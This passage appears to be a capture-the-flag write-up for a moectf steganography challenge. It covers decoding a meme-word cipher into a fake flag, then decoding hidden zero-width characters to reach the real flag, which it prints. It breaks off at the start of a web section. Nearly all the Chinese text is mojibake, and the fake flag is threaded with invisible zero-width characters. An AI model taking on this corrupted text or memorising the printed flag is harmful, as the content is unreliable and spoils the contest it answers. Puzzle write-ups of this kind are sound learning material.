™¶æ¤°å¥¶é¾™ï¼Ÿå“¦å—å‰åˆ©å¥ˆå“ªä¹°åŒ—å¥ˆè¯ºå¨œç¾å˜ï¼Œçªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°å™¶å¥ˆå“ªçªé‚£æ²¡æ’¸å¤šï¼Ÿé˜¿è¥¿å™¶å‹ä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œã€‚åº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¥ˆå“ˆåŸºç±³ï¼Ÿé˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¤šå¤šå‹é‚£é˜¿è¥¿å™¶å‹ã€‚çªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°åŒ—å¥ˆå“ªä¹°é˜¿è¥¿å™¶å‹ï¼›åº“è·¯æ›¼æ³¢å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šã€‚å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶å¥ˆå“ˆåŸºç±³ï¼›æ¤°å¥¶é¾™å“ªä¹°å™¶å¥ˆå“ªä¹°å“¦å—å‰åˆ©ï¼›å—åŒ—ç»¿è±†å™¶å¥ˆå“ªä¹°å“ˆåŸºç±³ï¼›å“ˆåŸºç±³å™¶å¤šå¤šå‹é‚£å¥ˆè¯ºå¨œç¾å˜ï¼Ÿçªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°åŒ—å¥ˆå“¦å—å‰åˆ©ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å¨œå¥ˆæ¤°å¥¶é¾™ã€‚å“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå“ªæ¬§è«å­£é‡Œï¼Ÿæ¤°å¥¶é¾™ä¹°å™¶å¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ã€‚å“ˆåŸºç±³å¥ˆå“ªä¹°å™¶å¥ˆå¥ˆè¯ºå¨œç¾å˜ï¼Ÿæ¬§è«å­£é‡Œå“ªä¹°å™¶å¤šå¤šå‹é‚£å“¦å—å‰åˆ©ï¼Œé˜¿è¥¿å™¶å‹å¥ˆå“ªä¹°å¨œå¥ˆå“ªä¹°å“¦å—å‰åˆ©ï¼Œå—åŒ—ç»¿è±†å¨œå¥ˆå“ªä¹°å™¶å¥ˆå“ªå“ˆåŸºç±³ï¼›åº“è·¯æ›¼æ³¢ä¹°å™¶å¥ˆå“ªä¹°çªé‚£æ²¡æ’¸å¤šã€‚å“ˆåŸºç±³å™¶å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼›æ¤°å¥¶é¾™å™¶å¥ˆå“ªä¹°å™¶å¤šå¤šçªé‚£æ²¡æ’¸å¤šï¼Œé˜¿è¥¿å™¶å‹å‹é‚£å¥ˆå“ªä¹°æ¤°å¥¶é¾™ï¼Œæ¬§è«å­£é‡Œå¨œå¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ï¼Œé˜¿è¥¿å™¶å‹åŒ—å¥ˆå“ªä¹°å™¶å¥ˆå“ªåº“è·¯æ›¼æ³¢ã€‚åº“è·¯æ›¼æ³¢ä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼Ÿå“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå—åŒ—ç»¿è±†ï¼Œå—åŒ—ç»¿è±†å“ªä¹°å¨œå¥ˆå“ªä¹°å“ˆåŸºç±³ï¼›å“¦å—å‰åˆ©åŒ—å¥ˆå“ªä¹°å™¶å¥ˆæ¤°å¥¶é¾™ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°åŒ—å¥ˆçªé‚£æ²¡æ’¸å¤šï¼Œé˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ï¼›å¥ˆè¯ºå¨œç¾å˜å™¶å¥ˆå“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œï¼Œé˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¥ˆå“ªçªé‚£æ²¡æ’¸å¤šã€‚å—åŒ—ç»¿è±†ä¹°å™¶å¤šå¤šé˜¿è¥¿å™¶å‹ï¼Œçªé‚£æ²¡æ’¸å¤šå‹é‚£å¥ˆå“ªé˜¿è¥¿å™¶å‹ï¼Ÿæ¤°å¥¶é¾™ä¹°åŒ—å¥ˆå“ªå¥ˆè¯ºå¨œç¾å˜ï¼›çªé‚£æ²¡æ’¸å¤šä¹°å¨œå¥ˆå“ªä¹°å™¶å¥ˆæ¤°å¥¶é¾™ï¼Ÿå“¦å—å‰åˆ©å“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ã€‚å“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå“ªçªé‚£æ²¡æ’¸å¤šï¼›åº“è·¯æ›¼æ³¢ä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œã€‚å—åŒ—ç»¿è±†å“ªä¹°åŒ—å¤šå¤šå‹é‚£çªé‚£æ²¡æ’¸å¤šï¼›æ¬§è«å­£é‡Œå¥ˆå“ªä¹°å¨œå¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ï¼›æ¤°å¥¶é¾™å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šï¼Œå¥ˆè¯ºå¨œç¾å˜å¥ˆå“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼›é˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¥ˆå“ªä¹°å¨œé˜¿è¥¿å™¶å‹ï¼›æ¤°å¥¶é¾™å¥ˆå“ªä¹°åŒ—å¥ˆæ¬§è«å­£é‡Œã€‚å¥ˆè¯ºå¨œç¾å˜å“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼Œæ¤°å¥¶é¾™å“ªä¹°å¨œå¥ˆå“ªä¹°æ¬§è«å­£é‡Œï¼Ÿåº“è·¯æ›¼æ³¢å™¶å¥ˆå“ªä¹°åº“è·¯æ›¼æ³¢ã€‚é˜¿è¥¿å™¶å‹å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šï¼›çªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°å™¶å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼Ÿé˜¿è¥¿å™¶å‹å™¶å¤šå¤šå‹é‚£æ¤°å¥¶é¾™ï¼Œåº“è·¯æ›¼æ³¢å¥ˆå“ªä¹°å¨œå“ˆåŸºç±³ï¼›çªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ï¼Œåº“è·¯æ›¼æ³¢å–”é…·å¨œåˆ©æ­¥å•Šé‚£çªé‚£æ²¡æ’¸å¤šï¼Ÿå—åŒ—ç»¿è±†å‰è±†æ²¡å’•å‰è±†æ¬§è«å­£é‡Œï¼›æ¬§è«å­£é‡Œæ²¡å’•å‰è±†æ²¡å—åŒ—ç»¿è±†ï¼Ÿåº“è·¯æ›¼æ³¢å’•å‰è±†æ²¡å’•åº“è·¯æ›¼æ³¢ã€‚å“ˆåŸºç±³å‰è±†æ²¡å’•å“¦å—å‰åˆ©ï¼Ÿå“ˆåŸºç±³å¥¶å‹å¤šé‚£å‰è±†åº“è·¯æ›¼æ³¢ï¼Œåº“è·¯æ›¼æ³¢æ²¡å’•å‰è±†è€¶å’•é˜¿è¥¿å™¶å‹ï¼Œæ¤°å¥¶é¾™å‰è±†æ²¡å’•å‰è±†æ²¡çªé‚£æ²¡æ’¸å¤šï¼Ÿé˜¿è¥¿å™¶å‹å’•å‰è±†æ²¡å’•æ¬§è«å­£é‡Œã€‚å¥ˆè¯ºå¨œç¾å˜å‰è±†æ²¡å’•å‰è±†å“ˆåŸºç±³ï¼Ÿæ¬§è«å­£é‡Œæ²¡å’•å¥¶å‹å¤šé‚£å‰åº“è·¯æ›¼æ³¢ï¼›é˜¿è¥¿å™¶å‹è±†æ²¡å’•å¥¶æ¤°å¥¶é¾™ï¼›å¥ˆè¯ºå¨œç¾å˜å‹å¤šé‚£å‰å—åŒ—ç»¿è±†ï¼Œçªé‚£æ²¡æ’¸å¤šè±†æ²¡å’•å‰æ¬§è«å­£é‡Œï¼›å—åŒ—ç»¿è±†è±†æ²¡å’•å‰è±†å¥ˆè¯ºå¨œç¾å˜ã€‚åº“è·¯æ›¼æ³¢æ²¡å’•å‰è±†å¥ˆè¯ºå¨œç¾å˜ï¼Œå—åŒ—ç»¿è±†æ²¡å’•å‰è±†æ²¡å’•å‰çªé‚£æ²¡æ’¸å¤šï¼Ÿåº“è·¯æ›¼æ³¢è±†è€¶å’•å¥¶å‹å¤šé˜¿è¥¿å™¶å‹ï¼Œå“ˆåŸºç±³é‚£å‰è±†æ²¡ç±³å‰è±†çªé‚£æ²¡æ’¸å¤šï¼›å“ˆåŸºç±³æ²¡å’•å‰è±†æ²¡å’•å‰å—åŒ—ç»¿è±†ï¼Ÿå¥ˆè¯ºå¨œç¾å˜è±†æ²¡å’•å‰è±†æ²¡å¥ˆè¯ºå¨œç¾å˜ï¼›å—åŒ—ç»¿è±†å’•å‰è±†æ²¡å—åŒ—ç»¿è±†ã€‚å¥ˆè¯ºå¨œç¾å˜å’•å¥¶å‹å¤šé‚£å‰å¥ˆè¯ºå¨œç¾å˜ï¼Ÿå—åŒ—ç»¿è±†è±†æ²¡ç±³å‰æ¤°å¥¶é¾™ï¼›æ¤°å¥¶é¾™è±†æ²¡å’•å‰è±†æ²¡çªé‚£æ²¡æ’¸å¤šï¼Ÿæ¬§è«å­£é‡Œå’•å‰è±†æ²¡å’•å‰è±†åº“è·¯æ›¼æ³¢ï¼›æ¬§è«å­£é‡Œæ²¡å’•å‰è±†æ²¡å’•å—åŒ—ç»¿è±†ï¼Ÿå¥ˆè¯ºå¨œç¾å˜å‰è±†æ²¡å’•å¥¶çªé‚£æ²¡æ’¸å¤šï¼›å—åŒ—ç»¿è±†å‹å¤šé‚£å‰è±†æ²¡å’•å“ˆåŸºç±³ï¼Ÿæ¬§è«å­£é‡Œå‰è±†æ²¡ç±³å‰è±†æ¬§è«å­£é‡Œï¼›é˜¿è¥¿å™¶å‹æ²¡å’•å‰è±†å¥ˆè¯ºå¨œç¾å˜ï¼›é˜¿è¥¿å™¶å‹æ²¡å’•å‰è±†æ²¡å’•å‰æ¤°å¥¶é¾™ï¼Œå“ˆåŸºç±³è±†æ²¡å’•å‰è±†æ²¡é˜¿è¥¿å™¶å‹ï¼Ÿå—åŒ—ç»¿è±†å’•å¥¶å‹å¤šé‚£æ¤°å¥¶é¾™ã€‚æ¬§è«å­£é‡Œå‰è±†æ²¡å’•å‰è±†æ²¡åº“è·¯æ›¼æ³¢ï¼›å“ˆåŸºç±³å—å–µå­è·¯è·¯å‰é˜¿è¥¿å™¶å‹ï¼Œçªé‚£æ²¡æ’¸å¤šè±†æ²¡å’•å‰è±†å“¦å—å‰åˆ©ï¼›å—åŒ—ç»¿è±†æ²¡å’•å‰è±†é˜¿è¥¿å™¶å‹ï¼Ÿé˜¿è¥¿å™¶å‹æ²¡å’•å‰è±†æ²¡å—åŒ—ç»¿è±†ï¼›å“ˆåŸºç±³å’•å‰è±†æ²¡å’•çªé‚£æ²¡æ’¸å¤šï¼›é˜¿è¥¿å™¶å‹å¥¶å‹å¤šé‚£å‰æ¤°å¥¶é¾™ï¼›åº“è·¯æ›¼æ³¢è±†æ²¡å’•å‰è±†æ²¡ç±³é˜¿è¥¿å™¶å‹ï¼Œå¥ˆè¯ºå¨œç¾å˜å‰è±†æ²¡å’•å‰çªé‚£æ²¡æ’¸å¤šã€‚é˜¿è¥¿å™¶å‹è±†æ²¡å’•å‰çªé‚£æ²¡æ’¸å¤šï¼Œé˜¿è¥¿å™¶å‹è±†æ²¡å’•å‰è±†æ¬§è«å­£é‡Œï¼Ÿåº“è·¯æ›¼æ³¢æ²¡å’•å‰è±†æ²¡çªé‚£æ²¡æ’¸å¤šï¼Œåº“è·¯æ›¼æ³¢å’•å‰è±†è€¶å’•å¥¶å‹çªé‚£æ²¡æ’¸å¤šï¼Ÿå“¦å—å‰åˆ©å¤šé‚£å‰è±†æ²¡ç±³é˜¿è¥¿å™¶å‹ã€‚å“ˆåŸºç±³å‰è±†æ²¡å’•å‰æ¬§è«å­£é‡Œï¼›å—åŒ—ç»¿è±†è±†æ²¡å’•å‰æ¬§è«å­£é‡Œã€‚å—åŒ—ç»¿è±†è±†æ²¡å’•å‰è±†æ²¡å’•å—åŒ—ç»¿è±†ï¼Ÿæ¤°å¥¶é¾™å‰è±†æ²¡ç±³å‰è±†æ¤°å¥¶é¾™ï¼›åº“è·¯æ›¼æ³¢è€¶å’•å‰è±†æ²¡é˜¿è¥¿å™¶å‹ï¼Ÿæ¬§è«å­£é‡Œå’•å‰è±†æ²¡ç±³å—åŒ—ç»¿è±†ï¼›å—åŒ—ç»¿è±†å‰è±†æ²¡å’•å‰è±†æ²¡å“ˆåŸºç±³ï¼›å“¦å—å‰åˆ©å’•å‰è±†æ²¡å’•å‰å¥ˆè¯ºå¨œç¾å˜ï¼Ÿçªé‚£æ²¡æ’¸å¤šè±†æ²¡å’•å‰è±†åº“è·¯æ›¼æ³¢ï¼Œåº“è·¯æ›¼æ³¢æ²¡å’•å¥¶å‹å¤šé‚£å‰é˜¿è¥¿å™¶å‹ã€‚çªé‚£æ²¡æ’¸å¤šè±†æ²¡å’•å‰è±†åº“è·¯æ›¼æ³¢ï¼Ÿé˜¿è¥¿å™¶å‹æ²¡è¥¿ä¸€å¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ï¼›å“¦å—å‰åˆ©å¥ˆå“ªä¹°å™¶å“¦å—å‰åˆ©ï¼›æ¤°å¥¶é¾™å¥ˆå“ªä¹°å™¶å¥ˆå—åŒ—ç»¿è±†ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¥ˆå“ªä¹°å¨œåº“è·¯æ›¼æ³¢ï¼Œå“ˆåŸºç±³å¥ˆå“ªä¹°åŒ—å¥ˆå“ªä¹°çªé‚£æ²¡æ’¸å¤šã€‚æ¬§è«å­£é‡Œå™¶å¥ˆå“ªä¹°åŒ—å¥ˆå“ˆåŸºç±³ï¼Œæ¤°å¥¶é¾™å“ªä¹°å™¶å¥ˆåº“è·¯æ›¼æ³¢ï¼Ÿå—åŒ—ç»¿è±†å“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œï¼›å“ˆåŸºç±³å“ªä¹°å™¶å¥ˆæ¤°å¥¶é¾™ï¼Œå¥ˆè¯ºå¨œç¾å˜å“ªä¹°å™¶å¥ˆå“ªå—åŒ—ç»¿è±†ï¼Œåº“è·¯æ›¼æ³¢ä¹°å¨œå¥ˆå“ªå“¦å—å‰åˆ©ï¼Ÿé˜¿è¥¿å™¶å‹ä¹°åŒ—å¥ˆå“ªä¹°å¨œå¥ˆåº“è·¯æ›¼æ³¢ã€‚æ¬§è«å­£é‡Œå“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¥ˆå“ªä¹°æ¬§è«å­£é‡Œï¼Ÿåº“è·¯æ›¼æ³¢å™¶å¥ˆå“ªä¹°å™¶å¥ˆçªé‚£æ²¡æ’¸å¤šï¼›é˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼›çªé‚£æ²¡æ’¸å¤šå“ªä¹°å™¶å¥ˆå“ªä¹°åŒ—å—åŒ—ç»¿è±†ã€‚åº“è·¯æ›¼æ³¢å¤šå¤šå‹é‚£æ¬§è«å­£é‡Œï¼Ÿæ¬§è«å­£é‡Œå¥ˆå“ªä¹°å¨œå¥ˆå“ªå“¦å—å‰åˆ©ï¼›å“ˆåŸºç±³ä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆåº“è·¯æ›¼æ³¢ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¥ˆåº“è·¯æ›¼æ³¢ï¼Ÿå¥ˆè¯ºå¨œç¾å˜å“ªä¹°å™¶å¥ˆå“ªé˜¿è¥¿å™¶å‹ï¼Œå—åŒ—ç»¿è±†ä¹°å™¶å¤šå¤šå‹åº“è·¯æ›¼æ³¢ï¼›å—åŒ—ç»¿è±†é‚£å¥ˆå“ªä¹°å¨œå¥ˆåº“è·¯æ›¼æ³¢ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°åŒ—å¥ˆå“ªæ¤°å¥¶é¾™ï¼Œæ¬§è«å­£é‡Œä¹°å™¶å¥ˆå“ªä¹°åº“è·¯æ›¼æ³¢ã€‚çªé‚£æ²¡æ’¸å¤šå™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šï¼Œå“ˆåŸºç±³å¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ã€‚å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶å¤šæ¤°å¥¶é¾™ï¼Ÿå“ˆåŸºç±³å¤šå‹é‚£å¥ˆå“ªé˜¿è¥¿å™¶å‹ï¼›åº“è·¯æ›¼æ³¢ä¹°å¨œå¥ˆå“ªä¹°æ¬§è«å­£é‡Œï¼Ÿåº“è·¯æ›¼æ³¢å¨œå¥ˆå“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œï¼›å“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå“ªæ¤°å¥¶é¾™ã€‚çªé‚£æ²¡æ’¸å¤šä¹°å™¶å¥ˆå“ªå¥ˆè¯ºå¨œç¾å˜ï¼›æ¤°å¥¶é¾™ä¹°å™¶å¥ˆå“ªä¹°åº“è·¯æ›¼æ³¢ï¼Œé˜¿è¥¿å™¶å‹å¨œå¥ˆå“ªä¹°åŒ—æ¤°å¥¶é¾™ã€‚å¥ˆè¯ºå¨œç¾å˜å¥ˆå“ªä¹°å™¶å¥ˆå“ˆåŸºç±³ï¼›çªé‚£æ²¡æ’¸å¤šå“ªä¹°åŒ—å¥ˆå“ªå“ˆåŸºç±³ã€‚å¥ˆè¯ºå¨œç¾å˜ä¹°å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šï¼Ÿå—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶æ¬§è«å­£é‡Œï¼Œåº“è·¯æ›¼æ³¢å¥ˆå“ªä¹°å™¶å¥ˆå“ªä¹°åº“è·¯æ›¼æ³¢ã€‚å—åŒ—ç»¿è±†å¨œå¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼›æ¬§è«å­£é‡ŒåŒ—å¥ˆå“ªä¹°å¨œå¥ˆå“¦å—å‰åˆ©ã€‚å“ˆåŸºç±³å“ªä¹°å¨œå­çªé‚£æ²¡æ’¸å¤šï¼›å—åŒ—ç»¿è±†é…·æ³¢åˆ©å­æ’¸å¨œå“ªå“ˆåŸºç±³ï¼Ÿå“ˆåŸºç±³å“ˆé‡Œæ¤°è·¯é˜¿è¥¿å™¶å‹ï¼Œé˜¿è¥¿å™¶å‹å¥ˆå“ªä¹°å™¶å¥ˆå“ªå“ˆåŸºç±³ã€‚å“ˆåŸºç±³ä¹°å™¶å¥ˆå“ªä¹°å™¶åº“è·¯æ›¼æ³¢ï¼Ÿæ¬§è«å­£é‡Œå¥ˆå“ªä¹°å™¶å¥ˆå“ªå—åŒ—ç»¿è±†ï¼Œå¥ˆè¯ºå¨œç¾å˜ä¹°å™¶å¤šå¤šæ¤°å¥¶é¾™ï¼›é˜¿è¥¿å™¶å‹å‹é‚£å¥ˆå“ªåº“è·¯æ›¼æ³¢ï¼›åº“è·¯æ›¼æ³¢ä¹°å™¶å¤šå¤šå‹é‚£å¥ˆåº“è·¯æ›¼æ³¢ï¼›å“¦å—å‰åˆ©å“ªä¹°å™¶å¥ˆå“ªä¹°å“¦å—å‰åˆ©ã€‚æ¤°å¥¶é¾™å™¶å¥ˆå“ªä¹°å™¶å¥ˆçªé‚£æ²¡æ’¸å¤šï¼Œé˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¥ˆå“ªä¹°å™¶æ¬§è«å­£é‡Œï¼Œåº“è·¯æ›¼æ³¢å¤šå¤šå‹é‚£å¥ˆåº“è·¯æ›¼æ³¢ï¼›çªé‚£æ²¡æ’¸å¤šå“ªä¹°å™¶å¤šå¤šå‹é‚£å“ˆåŸºç±³ï¼Œçªé‚£æ²¡æ’¸å¤šå–”ç±³å“¦å•Šå‘€ç ¸å¥ˆè¯ºå¨œç¾å˜ï¼›æ¤°å¥¶é¾™æ›¼å‰è±†æ²¡å’•å—åŒ—ç»¿è±†ï¼›åº“è·¯æ›¼æ³¢å‰è±†æ²¡å’•å‰è±†æ²¡é˜¿è¥¿å™¶å‹ï¼Ÿå“¦å—å‰åˆ©å’•å‰è±†æ²¡å’•å‰å“¦å—å‰åˆ©ï¼›åº“è·¯æ›¼æ³¢è±†æ²¡å’•å¥¶å‹åº“è·¯æ›¼æ³¢ã€‚åº“è·¯æ›¼æ³¢å¤šé‚£å‰è±†å—åŒ—ç»¿è±†ï¼Ÿå¥ˆè¯ºå¨œç¾å˜æ²¡ç±³å‰è±†åº“è·¯æ›¼æ³¢ï¼›å“¦å—å‰åˆ©è€¶å—ä¸€å¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ã€‚æ¤°å¥¶é¾™å™¶å¥ˆå“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼Ÿå“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šã€‚å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ï¼›çªé‚£æ²¡æ’¸å¤šå¤šå¤šå‹é‚£é˜¿è¥¿å™¶å‹ï¼Œé˜¿è¥¿å™¶å‹å¥ˆå“ªä¹°åŒ—å¥ˆé˜¿è¥¿å™¶å‹ï¼Œæ¬§è«å­£é‡Œå“ªä¹°å™¶å¥ˆå“ªä¹°å™¶å“ˆåŸºç±³ã€‚å“ˆåŸºç±³å¥ˆå“ªä¹°å™¶å¥ˆè¯ºå¨œç¾å˜ï¼Ÿå“ˆåŸºç±³å¥ˆå“ªä¹°å™¶åº“è·¯æ›¼æ³¢ã€‚å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶å¥ˆå“ªé˜¿è¥¿å™¶å‹ï¼Œå¥ˆè¯ºå¨œç¾å˜ä¹°å™¶å¤šå¤šå‹é‚£æ¬§è«å­£é‡Œï¼›å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶å“ˆåŸºç±³ï¼Œçªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°åŒ—å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼Œæ¬§è«å­£é‡Œå™¶å¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ï¼Ÿå“¦å—å‰åˆ©å™¶å¥ˆå“ªä¹°å“ˆåŸºç±³ï¼›å—åŒ—ç»¿è±†å™¶å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼›çªé‚£æ²¡æ’¸å¤šå™¶å¥ˆå“ªä¹°å¨œå¥ˆå“ªæ¤°å¥¶é¾™ï¼Œæ¬§è«å­£é‡Œä¹°åŒ—å¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ï¼Œåº“è·¯æ›¼æ³¢å¤šå¤šå‹é‚£å¥ˆå“ªä¹°å“ˆåŸºç±³ï¼›å“ˆåŸºç±³å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šï¼Ÿæ¬§è«å­£é‡Œå¥ˆå“ªä¹°å™¶å¥ˆå“ªä¹°å“¦å—å‰åˆ©ã€‚é˜¿è¥¿å™¶å‹å™¶å¥ˆå“ªä¹°å™¶å¤šå“¦å—å‰åˆ©ï¼Œé˜¿è¥¿å™¶å‹å¤šå‹é‚£å¥ˆå“ªä¹°é˜¿è¥¿å™¶å‹ï¼Œå“ˆåŸºç±³åŒ—å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼Œå—åŒ—ç»¿è±†å™¶å¥ˆå“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼Œæ¬§è«å­£é‡Œå“ªä¹°å™¶å¥ˆå“¦å—å‰åˆ©ã€‚æ¤°å¥¶é¾™å“ªä¹°å™¶å¥ˆå“ˆåŸºç±³ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¥ˆçªé‚£æ²¡æ’¸å¤šï¼Œå¥ˆè¯ºå¨œç¾å˜å“ªä¹°å™¶å¤šçªé‚£æ²¡æ’¸å¤šï¼Œæ¤°å¥¶é¾™å¤šå‹é‚£å¥ˆå“ªä¹°å™¶å—åŒ—ç»¿è±†ï¼Œé˜¿è¥¿å™¶å‹å¥ˆå“ªä¹°åŒ—å¥ˆå“ˆåŸºç±³ï¼›å“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå“ªå¥ˆè¯ºå¨œç¾å˜ï¼Œå“¦å—å‰åˆ©ä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼Œçªé‚£æ²¡æ’¸å¤šå“ªä¹°å™¶å¥ˆå“ªé˜¿è¥¿å™¶å‹ã€‚çªé‚£æ²¡æ’¸å¤šä¹°å¨œå¤šå¤šæ¤°å¥¶é¾™ï¼›æ¤°å¥¶é¾™å‹é‚£å¤šå¤šå‹å¥ˆè¯ºå¨œç¾å˜ï¼›é˜¿è¥¿å™¶å‹é‚£å¥ˆå“ªä¹°å¨œå—åŒ—ç»¿è±†ã€‚å“¦å—å‰åˆ©è‡ªç±³å“¦å•Šå—åŒ—ç»¿è±†ï¼›å¥ˆè¯ºå¨œç¾å˜å—é…·åŸºå‹æ­¥é…·æ¬§è«å­£é‡Œï¼›å¥ˆè¯ºå¨œç¾å˜é©¬ç¾å‹å–”å¥ˆè¯ºå¨œç¾å˜ï¼›çªé‚£æ²¡æ’¸å¤šè¯ºå“ªå‘€å–”å–µæ¬§è«å­£é‡Œï¼›æ¬§è«å­£é‡Œå“©æ¤°å¥¶é¾™ã€‚\n\nç”¨https://lhlnb.top/hajimi/base64è§£ç å¾—åˆ°\nâ€Œâ€Œâ€Œâ€Œâ€â€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€â€¬ï»¿ï»¿fakeflagâ€Œâ€Œâ€Œâ€Œâ€â€¬â€â€â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€ï»¿â€â€Œâ€Œâ€Œâ€Œâ€Œâ€â€¬â€â€¬&#123;â€Œâ€Œâ€Œâ€Œâ€ï»¿â€¬ï»¿youâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€¬â€Œâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€¬â€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€¬â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€¬â€â€Œâ€Œâ€Œâ€Œâ€Œâ€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€Œ_can_â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€Œâ€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€Œtryâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œâ€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€_â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€â€¬â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€¬â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€â€¬â€â€searchingâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œï»¿_textâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€¬_â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€¬â€Œâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€¬â€Œâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€ï»¿ï»¿â€Steganography&#125;\n\nç”¨é›¶å®½å­—ç¬¦è§£å¯†å³å¯\n\nmoectf&#123;1b8956b9-a423-4101-a1bd-65be33682c82&#125;\n\nweb1.æ§åˆ¶å°ä¸¢